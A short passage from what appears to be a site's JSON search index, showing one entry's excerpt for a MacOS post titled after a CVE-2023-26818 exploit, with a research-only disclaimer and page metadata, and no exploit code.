to us on the server after we exploit it, Disclaimer: This   exploit has been created solely for the purposes of research and for the development of effective defensive techniques. It is   not intended to be used for any malicious or unauthorized activities. The author and the owner of the script disclaim any   responsibility or liability for any misuse or damage caused by this software. Users are urged to use this software responsibly   and only in accordance with applicable laws and regulations. Not for non-ethical usages.  ","categories": ["MacOS"],
        "tags": [],
        "url": "http://localhost:5000/macos/CVE_2023_26818_exploit_P2/",
        "teaser": "http://localhost:5000/assets/images/clmew1zzzag5z1hn56hsedj45.png"
      }]
